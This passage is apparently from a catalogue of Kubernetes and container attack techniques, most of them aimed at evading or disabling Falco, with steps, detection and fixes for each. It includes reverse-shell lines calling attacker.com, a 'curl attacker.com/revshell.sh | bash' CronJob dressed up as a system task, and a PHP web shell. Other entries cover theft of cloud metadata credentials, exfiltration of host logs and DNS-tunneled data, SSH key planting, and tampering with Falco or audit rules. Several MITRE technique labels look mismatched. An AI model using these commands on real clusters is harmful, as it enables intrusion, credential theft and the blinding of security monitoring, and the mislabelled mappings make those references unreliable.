- **Attack Steps**: 1. Pod is launched with --network=host and cloud metadata IP access.2. Inside the pod, attacker runs curl http://169.254.169.254/latest/meta-data/iam/security-credentials/.3. If not blocked, this returns IAM credentials tied to the node.4. Attacker exfiltrates these and uses them for cloud API access.5. Optional: rotate metadata IP with a fake DNS for internal access.6. Logs are cleared post-exfiltration.7. This method is dangerous especially in EKS/GKE clusters.
- **Detection**: Curl access from untrusted pods
- **Solution**: Use IMDSv2 and metadata IP blocks
- **Tags**: #metadata #cloudcredentials #hostnetwork #aws #gcp

## Deploy DaemonSet That Silently Monitors File Access

- **Attack Type**: Silent Host Recon DaemonSet
- **Target**: Kubernetes Nodes
- **Vulnerability**: DaemonSet host path overexposure
- **MITRE**: T1087.002 (Account Discovery: Domain Account)
- **Impact**: Sensitive host intel leaked
- **Tools**: inotify-tools, curl, kubectl
- **Scenario**: DaemonSet watches /etc, /var/log, and other sensitive host paths and relays info externally.
- **Attack Steps**: 1. Attacker builds a container with inotifywait to monitor file events.2. DaemonSet is created that mounts key host paths (/etc, /var/log, /root).3. Script watches for file access/modification and logs it.4. Data is sent to external server every few minutes using curl or nc.5. Appears as a “monitoring” DaemonSet, blending into the cluster.6. Logs are deleted after exfiltration to avoid suspicion.7. Persistent across restarts, silent reconnaissance continues.
- **Detection**: Unusual access to protected directories
- **Solution**: Restrict DaemonSet creation, alert on host mounts
- **Tags**: #daemonset #recon #filewatch #k8s #exfiltration

## Use InitContainer to Hijack Entrypoint Script

- **Attack Type**: EntryPoint Tampering via Init
- **Target**: Kubernetes Pod
- **Vulnerability**: Shared volume misuse in InitContainer
- **MITRE**: T1546.001 (Registry Run Keys / Startup Folder)
- **Impact**: Startup hijack, undetected shell
- **Tools**: kubectl, Bash
- **Scenario**: Attacker uses InitContainer to replace the entrypoint script of main container with a malicious version.
- **Attack Steps**: 1. Attacker modifies deployment spec to include InitContainer.2. InitContainer mounts a shared volume with the main container.3. It overwrites the main entrypoint (e.g., /app/start.sh) with a reverse shell payload.4. When the main container starts, it runs the malicious script instead of the original.5. Payload connects to attacker's listener and optionally restores original behavior after delay.6. Logs are redirected or removed.7. Persistence is preserved across pod restarts unless YAML is audited.
- **Detection**: Unexpected outbound connections on pod start
- **Solution**: Enforce integrity of entrypoint scripts, use admission control
- **Tags**: #initcontainer #entrypoint #kubernetes #tampering #reverse-shell

## Overwhelm Falco with Syscall Noise

- **Attack Type**: Falco Alert Flood
- **Target**: Container with Falco Monitored
- **Vulnerability**: Falco not rate-limited or tuned for syscall storms
- **MITRE**: T1562.009 (Resource Hijacking)
- **Impact**: Falco misses or delays alerting on real threats
- **Tools**: stress, dd, yes, Bash
- **Scenario**: Attacker floods the container with high-frequency benign syscalls, causing Falco to throttle or miss actual malicious alerts.
- **Attack Steps**: 1. Attacker gains shell access inside a container running with Falco monitoring enabled on the host.2. They execute noisy commands to generate thousands of benign syscalls per second.3. For example, run: yes > /dev/null &, while true; do ls /; done &, or dd if=/dev/zero of=/tmp/test bs=1M count=100000.4. These operations generate file reads, writes, and process calls that are typically non-malicious but overwhelming in volume.5. Falco attempts to process these events, resulting in CPU strain or throttling of rule evaluation.6. While Falco is overwhelmed, the attacker performs stealthy malicious actions (e.g., privilege escalation, file tampering) that go undetected.7. The attacker may rotate noise patterns periodically to maintain overload without suspicion.8. Once their operation is complete, they kill the noise-generating processes.
- **Detection**: Spikes in syscalls or Falco CPU usage
- **Solution**: Enable syscall rate limits, apply per-container Falco rules
- **Tags**: #falco #noise #evasion #syscalls #throttling

## Persist with Hidden CronJob in Obscure Namespace

- **Attack Type**: Obfuscated Cron Persistence
- **Target**: Kubernetes Cluster
- **Vulnerability**: Lack of auditing in non-default namespaces
- **MITRE**: T1053.003 (Scheduled Task: Cron)
- **Impact**: Persistent remote shell in cluster
- **Tools**: kubectl, cronjob.yaml, Bash
- **Scenario**: A CronJob is scheduled in a rarely used namespace with misleading labels to continuously run a payload container.
- **Attack Steps**: 1. Attacker gains cluster access and uses kubectl create namespace metrics-cache to create an innocuous-sounding namespace.2. They deploy a CronJob inside it that launches a container every 10 minutes.3. The container executes a reverse shell or backconnect command: bash -i >& /dev/tcp/attacker.com/4444 0>&1.4. Labels and annotations of the CronJob are set to mimic system jobs, e.g., app: kube-probe, component: autoscaler.5. Logs are sent to /dev/null to avoid detection in standard logs.6. If a defender deletes the job or container, it returns at the next scheduled interval.7. The attacker can rotate IPs or update payloads by modifying the job spec dynamically.8. This ensures continuous callback and cluster presence even across node reboots.
- **Detection**: Unusual egress from obscure namespaces
- **Solution**: Enforce namespace whitelisting and RBAC on CronJob creation
- **Tags**: #cronjob #persistence #k8s #namespace #evasion

## Misuse InitContainer to Mount and Exfil Host Logs

- **Attack Type**: Host Log Theft via InitContainer
- **Target**: Kubernetes Pod on Host
- **Vulnerability**: Host path mount used without controls
- **MITRE**: T1005 (Data from Local System)
- **Impact**: Leak of historical host activity logs
- **Tools**: kubectl, curl, Bash
- **Scenario**: InitContainer is used to mount host /var/log and exfil sensitive audit logs before the main container runs.
- **Attack Steps**: 1. The attacker modifies a deployment spec to add an InitContainer that mounts /var/log via hostPath volume.2. They inject a script in the InitContainer that runs before the application starts.3. The script recursively copies key logs such as audit.log, auth.log, messages, containerd.log into a temporary archive: tar -czf /tmp/logs.tar.gz /host/var/log/*.4. It then uses curl -X POST or scp to send the archive to an attacker-controlled server.5. After exfiltration, the script deletes the tarball and exits.6. The main container then boots and continues its application lifecycle with no visibility of what occurred.7. If logs are rotated or deleted on the host, security teams may never detect this theft.8. The attacker gains deep insight into past administrator and container activities.
- **Detection**: Suspicious InitContainer egress patterns
- **Solution**: Restrict hostPath mounts to approved workloads only
- **Tags**: #initcontainer #logtheft #hostpath #exfiltration #evasion

## Escape Detection by Writing Falco-Excluded Paths

- **Attack Type**: File Write in Unmonitored Directory
- **Target**: Container or Host
- **Vulnerability**: Falco ruleset doesn’t cover custom/uncommon paths
- **MITRE**: T1027.002 (Obfuscated Files or Information: Software Packing)
- **Impact**: Payloads deployed without alert
- **Tools**: mkdir, touch, Falco YAML
- **Scenario**: Attacker stores payloads in directories not monitored by Falco to avoid triggering rules.
- **Attack Steps**: 1. Attacker identifies which paths Falco rules are actively monitoring (e.g., /etc, /var, /usr/bin).2. They locate unmonitored directories like /dev/shm, /proc/acpi, /tmp/cache or create hidden folders such as /data/.bin.3. They deploy their payloads, backdoors, or staging scripts in these directories.4. Actions such as binary drops, cron file creation, or script scheduling occur inside these paths.5. Falco, which relies on rule-based syscall monitoring, doesn't detect activity unless the rule explicitly covers the location.6. The attacker then executes the payload from these paths or schedules it via cron/at.7. Logs are cleared, and no alerts are generated from Falco unless configured otherwise.8. Detection is avoided entirely due to weak path coverage.
- **Detection**: Lack of alerts from known evasion paths
- **Solution**: Expand Falco ruleset to include hidden and tmp paths
- **Tags**: #falco #pathbypass #obfuscation #filedrop #containersecurity

## Intercept DNS with Host-Networked Alpine Container

- **Attack Type**: Network Recon via DNS Poisoning
- **Target**: Host Networked Container
- **Vulnerability**: DNS not isolated between host and container
- **MITRE**: T1557.001 (Adversary-in-the-Middle)
- **Impact**: Data interception or redirection
- **Tools**: Docker, tcpdump, dnsmasq
- **Scenario**: Lightweight Alpine container using host networking is used to sniff or poison DNS traffic.
- **Attack Steps**: 1. The attacker launches an Alpine-based container with --network=host.2. They install tcpdump and dnsmasq in the container.3. First, tcpdump -i any port 53 is used to monitor all DNS queries made from the node and containers.4. The attacker logs domain names resolved (e.g., internal service discovery domains).5. Optionally, they configure dnsmasq to respond to DNS queries with forged IPs, redirecting apps to attacker-controlled addresses.6. This enables interception of traffic meant for legitimate services.7. Logs are stored locally and rotated frequently to avoid detection.8. This attack remains stealthy as it uses legitimate tooling in a container context.
- **Detection**: DNS traffic from untrusted containers
- **Solution**: Forbid host networking; use CoreDNS strict policies
- **Tags**: #dns #interception #hostnetwork #sniffing #containersecurity

## Falco Ruleset Corruption via CI/CD Repo Injection

- **Attack Type**: Falco Rule Poisoning
- **Target**: GitOps-Driven Falco Deployment
- **Vulnerability**: Weak repo controls + auto-sync to production
- **MITRE**: T1562.006 (Indicator Removal from Tools)
- **Impact**: Falco blind to targeted behavior
- **Tools**: Git, Falco, CI/CD, YAML
- **Scenario**: Attacker injects corrupted Falco rules into the GitOps-managed repo, which get auto-applied across the cluster.
- **Attack Steps**: 1. Attacker compromises the GitOps repo or a CI/CD pipeline managing Falco rules.2. They modify the falco_rules.yaml file by adding condition: always_false() to critical rules like read_sensitive_file, exec_shell_in_container.3. Commit is pushed under a benign username with misleading messages (e.g., "optimize syscall filters").4. CI/CD auto-syncs the rule changes to all Falco agents via Helm, ArgoCD, or FluxCD.5. Falco reloads these poisoned rules and silently stops detecting important behaviors.6. The attacker then proceeds with malicious actions (e.g., lateral movement) without generating alerts.7. DevOps teams may never notice unless rules are manually reviewed or alerts are audited.8. The attacker can revert rules later to cover tracks.
- **Detection**: Audit trail shows false rule edits
- **Solution**: Enforce code review, integrity checks on rules
- **Tags**: #gitops #falco #ci-cd #evasion #rulebypass

## InitContainer Persists via Sidecar Hijack

- **Attack Type**: Init-to-Sidecar Escalation
- **Target**: Kubernetes Pod
- **Vulnerability**: Misused shared volume between containers
- **MITRE**: T1546.001 (Startup Folder Hijack)
- **Impact**: Covert execution of persistent payload
- **Tools**: kubectl, Bash, YAML
- **Scenario**: InitContainer copies a malicious binary to a shared volume used by a sidecar, which then executes it at runtime.
- **Attack Steps**: 1. Attacker modifies a pod spec that includes both an InitContainer and a sidecar container.2. They configure a shared volume (e.g., emptyDir) that is mounted to both containers.3. In the InitContainer, a payload binary (e.g., reverse shell or credential stealer) is copied into the shared volume.4. The sidecar is configured to execute any binary placed in /app/hooks/start.sh or similar.5. As the pod starts, the sidecar executes the malicious binary left behind by the InitContainer.6. This results in covert execution without altering the main application container.7. Even if defenders inspect the main container, the payload is executed from a secondary path.8. This technique ensures persistent execution across pod restarts.
- **Detection**: Unusual file access between containers
- **Solution**: Restrict volume sharing; scan shared mountpoints
- **Tags**: #initcontainer #sidecar #startup #sharedvolume #evasion

## Exploit Falco’s Kernel Module Reload Delay

- **Attack Type**: Temporal Detection Bypass
- **Target**: Host or Container
- **Vulnerability**: Known driver reinit window in Falco
- **MITRE**: T1562.009 (Resource Hijacking)
- **Impact**: Attack occurs before Falco activates
- **Tools**: systemctl, falco, Bash
- **Scenario**: After Falco restart or upgrade, attacker exploits a brief delay before the kernel module becomes active.
- **Attack Steps**: 1. The attacker triggers a Falco service restart via systemctl restart falco or container kill if accessible.2. During startup, Falco may take several seconds to reinitialize its kernel driver (e.g., using kmod or eBPF).3. The attacker performs key operations (e.g., dropping a reverse shell, modifying cron) during this delay.4. Since the kernel module is not yet active, these syscalls are not captured.5. They clean up artifacts before the module finishes loading.6. Optional: attacker monitors Falco logs for timestamps of “driver loaded” messages to time the attack.7. If timed well, this results in a completely undetected attack window.8. After the delay, Falco resumes normal operation.
- **Detection**: Timeline mismatch in Falco logs
- **Solution**: Harden Falco startup; monitor reinit gaps
- **Tags**: #falco #timing #evasion #kernelmodule #attackwindow

## Poison Host DNS Resolver from Container

- **Attack Type**: DNS Poisoning via /etc/resolv.conf
- **Target**: Host OS via Container
- **Vulnerability**: Overwritable DNS config with hostPath mount
- **MITRE**: T1557.001 (Adversary-in-the-Middle)
- **Impact**: DNS hijack + traffic reroute
- **Tools**: Bash, Docker
- **Scenario**: Attacker inside a privileged container rewrites the host’s DNS settings to hijack outbound traffic.
- **Attack Steps**: 1. A privileged container is launched with access to the host’s filesystem using -v /etc:/host/etc.2. Attacker enters the container and overwrites the host’s /etc/resolv.conf via /host/etc/resolv.conf.3. They change the nameserver to a malicious DNS server (e.g., nameserver 6.6.6.6).4. Host or containers using host DNS now resolve domain names through the attacker’s controlled DNS.5. This allows phishing, traffic redirection, or MITM attacks on cloud services.6. Attacker may log DNS queries or spoof key services like AWS S3.7. Logs are deleted post-change, and original file may be restored after exploitation.8. The attack impacts all workloads using host DNS.
- **Detection**: Changed resolv.conf on host
- **Solution**: Protect /etc mount, enforce immutable DNS
- **Tags**: #dns #resolver #hostoverwrite #privilegedcontainer

## Periodic Payload Delivery via CronJob + Secret Volume

- **Attack Type**: Secret Volume-Based Execution
- **Target**: Kubernetes CronJob
- **Vulnerability**: Executable embedded in secret volume
- **MITRE**: T1053.003 (Scheduled Task: Cron)
- **Impact**: Repeating execution of embedded payloads
- **Tools**: kubectl, Bash
- **Scenario**: CronJob mounts Kubernetes secret as a volume, extracts and executes binary on schedule.
- **Attack Steps**: 1. Attacker creates a secret in Kubernetes with an encoded binary payload (e.g., Base64-encoded reverse shell).2. A CronJob is deployed that mounts this secret as a volume.3. Every 10 minutes, the job decodes and writes the binary to disk inside the pod.4. It sets executable permissions and runs the payload.5. Logs and artifacts are deleted after execution using rm -rf /tmp/*.6. The payload can be updated by replacing the secret without altering the job.7. This stealth technique hides the binary from the filesystem until runtime.8. The attacker receives connections silently on schedule.
- **Detection**: CronJob touching secret volume repeatedly
- **Solution**: Scan secrets for binary content; alert on decode exec patterns
- **Tags**: #cronjob #secretvolume #execution #backdoor #evasion

## Replace Falco Binary with Trojanized Version

- **Attack Type**: Falco Binary Hijack
- **Target**: Falco Host Runtime
- **Vulnerability**: No integrity check or signed binary enforcement
- **MITRE**: T1036.003 (Masquerading: Rename System Utilities)
- **Impact**: Falco detection fully bypassed
- **Tools**: Bash, cp, kill, custom Falco build
- **Scenario**: Attacker replaces the Falco binary with a fake version that appears normal but silently disables alerting.
- **Attack Steps**: Attacker first obtains privileged access to the host running Falco. They identify the original Falco binary path (e.g., /usr/bin/falco). They compile or obtain a fake Falco binary that mimics logs but lacks real detection. They stop the Falco service using systemctl or kill. They overwrite the binary with the fake one. Then, restart Falco to make it appear functional. Now the attacker can continue malicious activity without alerts being raised.
- **Detection**: Compare binary hash to expected; verify file timestamps
- **Solution**: Use signed binaries and immutable containers
- **Tags**: #falco #evasion #binarytrojan #loggingbypass

## Deploy Web Shell via InitContainer

- **Attack Type**: Web Shell Initialization
- **Target**: Kubernetes Pod
- **Vulnerability**: Shared volume allows tampering with application files
- **MITRE**: T1505.003 (Server Software Component)
- **Impact**: Remote command execution via HTTP
- **Tools**: kubectl, Bash, curl, PHP
- **Scenario**: Attacker leverages InitContainer to plant a PHP web shell before application startup.
- **Attack Steps**: Attacker modifies pod spec to include InitContainer with a shared volume mounted to web root. InitContainer writes a PHP shell like '<?php system($_GET["cmd"]); ?>' to that volume. When main app container starts, it serves that file. Attacker accesses it via browser using http://target/shell.php?cmd=id to execute commands. Shell is re-deployed every time pod starts, ensuring persistence. This setup is stealthy and avoids detection from common runtime monitors.
- **Detection**: Look for unauthorized file changes in web root
- **Solution**: Block InitContainers from modifying app data
- **Tags**: #initcontainer #webshell #backdoor #kubernetes

## Sniff Host Network Traffic Using Host Network Container

- **Attack Type**: Traffic Interception
- **Target**: Host Networked Container
- **Vulnerability**: Containers share host network without isolation
- **MITRE**: T1040 (Network Sniffing)
- **Impact**: Credential theft or service discovery via packet capture
- **Tools**: tcpdump, tshark, Docker
- **Scenario**: Host-networked container sniffs unencrypted network traffic for credentials or service names.
- **Attack Steps**: Attacker runs a container with --network=host and installs tcpdump inside. They run tcpdump -i any port 80 or port 23 to capture plaintext HTTP or Telnet traffic. Data is stored in .pcap files. Attacker exfiltrates those files and analyzes them in Wireshark to recover credentials or tokens. The activity goes unnoticed unless container logs or host interfaces are heavily monitored.
- **Detection**: Monitor for containers with host network usage
- **Solution**: Forbid host networking unless absolutely necessary
- **Tags**: #sniffing #tcpdump #hostnetwork #eavesdropping

## Overload Falco with Log Flood to Delay Detection

- **Attack Type**: Log Flood Delay
- **Target**: Falco Host Runtime
- **Vulnerability**: Falco not rate-limited or isolated from noisy logs
- **MITRE**: T1562.009 (Resource Hijacking)
- **Impact**: Detection delays, dropped alerts under log overload
- **Tools**: logger, echo, Bash
- **Scenario**: Excessive log generation slows down Falco's ability to parse and alert on critical events.
- **Attack Steps**: Attacker launches a flood loop inside container: for i in {1..10000}; do logger "spam log $i"; done. The logs are ingested by Falco, increasing CPU load and causing delayed analysis. During the delay, attacker executes real malicious actions like mounting sensitive volumes or opening reverse shells. Once done, log generation is stopped. Delays in alerting give attacker a window for stealthy operations.
- **Detection**: Look for abnormal logging rate or CPU usage spikes
- **Solution**: Throttle logging, isolate Falco's input stream
- **Tags**: #falco #logflooding #noisedriven #evasion

## Mislead Defenders with CronJob Named Like System Task

- **Attack Type**: Disguised CronJob
- **Target**: Kubernetes Cluster
- **Vulnerability**: Inconsistent RBAC or monitoring on CronJob creation
- **MITRE**: T1053.003 (Scheduled Task: Cron)
- **Impact**: Recurring reverse shell disguised as system task
- **Tools**: kubectl, Bash
- **Scenario**: Attacker schedules malicious CronJob with a name and labels mimicking legitimate system activity.
- **Attack Steps**: Attacker creates CronJob named kube-node-time-sync and adds labels like tier=system, app=kube-proxy. Job runs curl attacker.com/revshell.sh | bash every 15 minutes to ensure a backdoor stays open. Because the name and labels mimic real system processes, defenders may ignore it. If noticed, attacker deletes and redeploys job with different system-like name.
- **Detection**: Monitor all CronJobs including names and labels
- **Solution**: Restrict RBAC and namespace job deployment
- **Tags**: #cronjob #obfuscation #evasion #kubernetes

## Modify Host Audit Rules via Privileged Container

- **Attack Type**: Audit Log Tampering
- **Target**: Host OS via Container
- **Vulnerability**: Privileged container permits kernel-level changes
- **MITRE**: T1562.001 (Disable Security Tools)
- **Impact**: Audit logs for sensitive syscalls are suppressed
- **Tools**: auditctl, chroot, Docker
- **Scenario**: Auditctl is used from inside privileged container to remove critical monitoring rules from the host.
- **Attack Steps**: Attacker runs privileged container with host volume mounted. They chroot into /host and use auditctl to list and delete rules like -S execve or -S open. This disables auditing of sensitive actions like command execution or file access. After exfiltration or privilege escalation, attacker may re-enable audit rules to avoid suspicion. Entire attack remains invisible in audit logs.
- **Detection**: Detect unexpected auditctl activity from containers
- **Solution**: Enforce audit rules; forbid privileged container use
- **Tags**: #auditlog #tampering #hostevasion #privilegeabuse

## Persistent Sidecar with Listener Port for C2

- **Attack Type**: CronJob Sidecar C2
- **Target**: Kubernetes Cluster
- **Vulnerability**: Insecure CronJob allows custom sidecars
- **MITRE**: T1095 (Non-Application Layer Protocol)
- **Impact**: Covert interactive backdoor using job and sidecar
- **Tools**: kubectl, nc, Bash
- **Scenario**: CronJob pod includes a sidecar container that listens for remote attacker instructions.
- **Attack Steps**: Attacker deploys a CronJob with a second container acting as a listener using netcat: nc -lvp 5555. Main container downloads and runs payloads while sidecar receives C2 commands. Both share a volume or use sockets to communicate. Attacker connects to sidecar via network and issues instructions. Logs are discarded and job uses labels like app=backup or tier=ops. The CronJob restarts periodically, keeping C2 channel alive.
- **Detection**: Audit for listener ports in CronJob containers
- **Solution**: Restrict multi-container CronJobs; enforce port policies
- **Tags**: #c2 #sidecar #cronjob #stealth #listener

## Hijack DNS Resolution via Hosts File

- **Attack Type**: Hosts File Poisoning
- **Target**: Kubernetes Pod
- **Vulnerability**: Writable /etc via volume mount
- **MITRE**: T1557.001 (Adversary-in-the-Middle)
- **Impact**: Silent redirection of internal app traffic via DNS spoofing
- **Tools**: Bash, kubectl
- **Scenario**: InitContainer writes fake entries to /etc/hosts, redirecting DNS within the pod.
- **Attack Steps**: InitContainer writes "10.1.2.3 internal-api.k8s.local" to /etc/hosts using a shared writable volume. Main container then resolves internal-api.k8s.local to attacker's IP. This allows interception of traffic from the app to sensitive services. No DNS logs are triggered, and everything looks like normal hostname resolution. Technique survives across pod restarts.
- **Detection**: Check container /etc/hosts contents vs baseline
- **Solution**: Disallow writing to /etc; avoid hostPath to system dirs
- **Tags**: #dns #hostspoofing #initcontainer #evasion

## Keep Shell Alive in CronJob Using Sleep Loop

- **Attack Type**: Sleep-Based Shell Persistence
- **Target**: Kubernetes Cluster
- **Vulnerability**: CronJobs not monitored for shell or sleep usage
- **MITRE**: T1053.003 (Scheduled Task: Cron)
- **Impact**: Long-running reverse shell disguised as debug job
- **Tools**: Bash, kubectl
- **Scenario**: CronJob runs a shell that sleeps for most of the job interval to maintain backdoor access.
- **Attack Steps**: Attacker creates a CronJob that runs every 5 minutes and executes: bash -i >& /dev/tcp/attacker.com/443 0>&1; sleep 240. This gives them a 4-minute shell session every cycle. Job logs are discarded. Job uses innocent labels like debug=true. Access is consistent and easy to overlook since job appears short-lived. Repeating interval keeps shell going indefinitely.
- **Detection**: Monitor command structure and sleep intervals in CronJobs
- **Solution**: Enforce job whitelisting and limit execution time
- **Tags**: #cronjob #sleep #recurrentshell #covertaccess

## Read Falco Alerts from Socket to Avoid Detection

- **Attack Type**: Adaptive Behavior via Falco Alerts
- **Target**: Falco Node Runtime
- **Vulnerability**: Alert socket is world-readable or weakly protected
- **MITRE**: T1557 (Man-in-the-Middle)
- **Impact**: Real-time adaptive evasion of Falco alerts
- **Tools**: nc, Bash, Falco socket
- **Scenario**: Attacker monitors Falco socket to see alerts in real time and avoid detection.
- **Attack Steps**: Attacker connects to /var/run/falco.sock using netcat (nc -U /var/run/falco.sock). They receive Falco alert messages in JSON format. When alerts are triggered, attacker stops their activity. When alerts stop, they resume. This feedback loop lets them tune attacks to avoid rule matches. Very stealthy if socket access is not restricted.
- **Detection**: Monitor access to Falco sockets and alert channels
- **Solution**: Lock down socket permissions with AppArmor/SELinux
- **Tags**: #falco #socket #alertaware #adaptiveevasion

## DaemonSet for Hidden Reverse Shell

- **Attack Type**: Persistent Shell via DaemonSet
- **Target**: Kubernetes Cluster
- **Vulnerability**: Abuse of DaemonSet allows privileged replication
- **MITRE**: T1053.005 (Scheduled Task: Daemon)
- **Impact**: Cluster-wide backdoor with persistence
- **Tools**: kubectl, bash, nc
- **Scenario**: Attacker deploys a DaemonSet that runs a hidden reverse shell on all nodes.
- **Attack Steps**: Attacker uses kubectl to create a DaemonSet across all nodes with a pod that includes a reverse shell command like bash -i >& /dev/tcp/attacker.com/443 0>&1. Labels the DaemonSet with something benign like app=node-monitor to avoid detection. Sets restartPolicy=Always to ensure persistence. Even if one node is cleaned, others maintain the shell. Attacker has distributed access across the cluster.
- **Detection**: Audit DaemonSet manifests, especially under non-standard namespaces
- **Solution**: Restrict permissions to create or modify DaemonSets
- **Tags**: #daemonset #reverse_shell #persistence #kubernetes

## Disable Falco via HostPID Container

- **Attack Type**: Terminate Detection Process
- **Target**: Falco Host
- **Vulnerability**: HostPID allows access to host process tree
- **MITRE**: T1562.001 (Disable Security Tools)
- **Impact**: Detection system completely disabled
- **Tools**: kubectl, bash, kill, ps
- **Scenario**: Attacker uses hostPID container to directly kill Falco process on host.
- **Attack Steps**: Attacker deploys a container with hostPID enabled and necessary capabilities (SYS_PTRACE, SYS_ADMIN). Runs ps aux inside container to find Falco PID on host. Executes kill -9 <pid> to terminate the process. Falco daemon is silently stopped, and attacker continues operations without runtime alerts. If watchdog isn’t configured, Falco stays down permanently.
- **Detection**: Check for containers with hostPID and kill syscalls
- **Solution**: Prevent hostPID usage; use Falco watchdog for recovery
- **Tags**: #falco #hostpid #killfalco #disableedr

## CronJob that Drops SSH Key Every Hour

- **Attack Type**: SSH Persistence via Job
- **Target**: Kubernetes Host Node
- **Vulnerability**: CronJob can modify host user files via mount
- **MITRE**: T1053.003 (Scheduled Task: Cron)
- **Impact**: SSH persistence that survives key removal
- **Tools**: kubectl, bash, echo
- **Scenario**: CronJob writes SSH key to authorized_keys repeatedly to maintain access.
- **Attack Steps**: Attacker creates a CronJob scheduled every hour that writes a public SSH key to a known user's ~/.ssh/authorized_keys file. Uses shared volume or mounts hostPath to user home. Even if defender removes the key, it is re-added by the next CronJob cycle. Job uses misleading name like kube-log-uploader. SSH access remains persistent and self-healing.
- **Detection**: Audit CronJob specs for suspicious file write operations
- **Solution**: Block hostPath mounts to user home directories
- **Tags**: #cronjob #ssh #persistence #authorizedkeys

## Masquerade Falco Binary Location

- **Attack Type**: Path Masquerading
- **Target**: Falco Runtime
- **Vulnerability**: Path confusion and weak binary monitoring
- **MITRE**: T1036 (Masquerading)
- **Impact**: Falco bypass and admin misdirection
- **Tools**: cp, bash, systemctl
- **Scenario**: Attacker places real Falco binary in an unused directory and creates a fake one at expected path.
- **Attack Steps**: Attacker copies the real Falco binary to /opt/.falco_hidden and runs it from there. Then, creates a fake script at /usr/bin/falco that prints logs but does nothing. Defender checking the binary will think Falco is running normally. Attacker monitors alerts from hidden binary but prevents detection by defenders reviewing system status.
- **Detection**: Hash compare binaries; verify actual executing path
- **Solution**: Use integrity tools and signed binary enforcement
- **Tags**: #falco #masquerade #fakebinary #hidingprocess

## Exfiltrate Secrets by DNS Tunneling Inside Pod

- **Attack Type**: DNS Covert Channel
- **Target**: Falco/EDR-blind Pod
- **Vulnerability**: DNS egress not monitored or restricted
- **MITRE**: T1048.003 (Exfiltration Over Alternative Protocol: DNS)
- **Impact**: Covert exfiltration via whitelisted protocol
- **Tools**: dig, bash, base64
- **Scenario**: Attacker uses host networking and tools like dig to exfiltrate secrets via DNS.
- **Attack Steps**: Inside container with host networking, attacker encodes sensitive data using base64 and chunks it into DNS queries like secret1.base64.attackerdomain.com. Queries are sent using dig or nslookup. External DNS server under attacker’s control receives the data covertly. As DNS is often whitelisted, no alerts are triggered.
- **Detection**: Log high-rate or large DNS queries; monitor unusual domains
- **Solution**: Block DNS egress to unknown domains from containers
- **Tags**: #dnstunnel #exfiltration #hostnetwork #k8s

## Persistent Shell via Sleep-Infinite Command in Pod

- **Attack Type**: Pod-Level Backdoor
- **Target**: Kubernetes Pod
- **Vulnerability**: Idle container blends in with environment
- **MITRE**: T1059.004 (Command and Scripting Interpreter: Unix Shell)
- **Impact**: Backdoor shell available on-demand
- **Tools**: kubectl, bash
- **Scenario**: Simple pod container runs a sleep infinity shell that attacker can exec into anytime.
- **Attack Steps**: Attacker deploys a Pod with container spec: command: ["/bin/sh", "-c"], args: ["sleep infinity"]. Container runs idle and stays alive indefinitely. Attacker execs into it when needed using kubectl exec. Since it performs no workload, it avoids detection. Pod labeled as part of dev-debug or staging environment. Easy to miss unless strict workload policies exist.
- **Detection**: Check for long-running idle pods with no activity
- **Solution**: Disallow sleep-based containers or debug pods in prod
- **Tags**: #sleepinfinity #backdoor #k8s #containerdebug

## InitContainer Injects Malicious Binary into Main App

- **Attack Type**: Binary Injection
- **Target**: Kubernetes Pod
- **Vulnerability**: Shared volume write access from InitContainer
- **MITRE**: T1055.002 (Dynamic-link Library Injection)
- **Impact**: App compromised via startup phase injection
- **Tools**: kubectl, cp, bash
- **Scenario**: Attacker uses InitContainer to copy a malicious binary into the shared app volume.
- **Attack Steps**: Attacker creates InitContainer that runs before the main application container. It copies a malicious ELF binary into /app/bin or another location shared with main container. Once the app starts, it unknowingly runs or links to that binary. Used for privilege escalation or data exfil. Pod restart or redeploy preserves persistence.
- **Detection**: Compare InitContainer logic vs production baseline
- **Solution**: Block InitContainers from modifying core app files
- **Tags**: #initcontainer #injection #binarydrop #k8sattack

## DaemonSet with IPTables Rules to Block Security Agent

- **Attack Type**: EDR Network Isolation
- **Target**: Kubernetes Cluster
- **Vulnerability**: DaemonSet can modify node network rules
- **MITRE**: T1562.004 (Disable or Modify System Firewall)
- **Impact**: Agent bypass via network blackhole
- **Tools**: kubectl, iptables
- **Scenario**: Attacker deploys DaemonSet that uses iptables to block EDR/Falco traffic to backend.
- **Attack Steps**: Attacker creates a DaemonSet with privileged containers on each node. Each container runs iptables -A OUTPUT -d falco-backend.internal -j DROP, blocking outbound traffic to Falco’s backend collector. Agent still runs locally but no alerts reach SIEM. Used to stealthily mute detection while appearing functional.
- **Detection**: Check network egress from agents; validate heartbeat
- **Solution**: Restrict iptables privileges; use egress policies
- **Tags**: #iptables #daemonset #falcoevasion #networkmute

## Attach to Running Pod via nsenter from Host

- **Attack Type**: Host Namespace Access
- **Target**: Host OS / Container
- **Vulnerability**: PID namespace separation weak or bypassed
- **MITRE**: T1057 (Process Discovery)
- **Impact**: Silent interaction inside running container without detection
- **Tools**: nsenter, bash, docker inspect
- **Scenario**: Attacker uses nsenter on host to interact with running container, bypassing logs.
- **Attack Steps**: Attacker on host locates container PID using docker inspect or crictl inspect. Uses nsenter --target <PID> --mount --uts --ipc --net --pid /bin/bash to enter container namespace. Interacts with container silently without triggering logs in kubectl or Falco. Often used to extract secrets or drop payloads without audit.
- **Detection**: Monitor for nsenter usage and host process access
- **Solution**: Restrict host access; disable nsenter from containers
- **Tags**: #nsenter #hostbypass #containerentry #auditgap

## Corrupt Falco Rules File to Disable Detection

- **Attack Type**: Falco Rule Poisoning
- **Target**: Falco Host
- **Vulnerability**: Config not validated or integrity checked
- **MITRE**: T1562.006 (Indicator Removal from Tools)
- **Impact**: Detection engine blind due to broken ruleset
- **Tools**: vim, sed, echo
- **Scenario**: Attacker modifies Falco rules.yaml to comment or corrupt key detection rules.
- **Attack Steps**: Attacker accesses /etc/falco/falco_rules.yaml and comments out rules for execve or file write events. Also adds malformed lines to cause parsing failure. Falco fails to start or runs without key detection coverage. This can be done via container if volume is mounted or directly on host. Effective when defenders don’t validate config integrity.
- **Detection**: Monitor Falco startup logs and rules checksum
- **Solution**: Enforce rule file integrity; automate rule audits
- **Tags**: #falcorules #corruption #detectionbypass #configattack

## Bypass Falco Detection Using Custom Syscalls

- **Attack Type**: Custom Syscall Evasion
- **Target**: Falco Runtime
- **Vulnerability**: Falco may not hook low-level syscall usage directly
- **MITRE**: T1059.006 (Command and Scripting Interpreter: Native API)
- **Impact**: Evasion of rule-based syscall detection systems
- **Tools**: nasm, gcc, strace
- **Scenario**: Attacker crafts malware that uses syscall numbers directly instead of invoking standard C libraries.
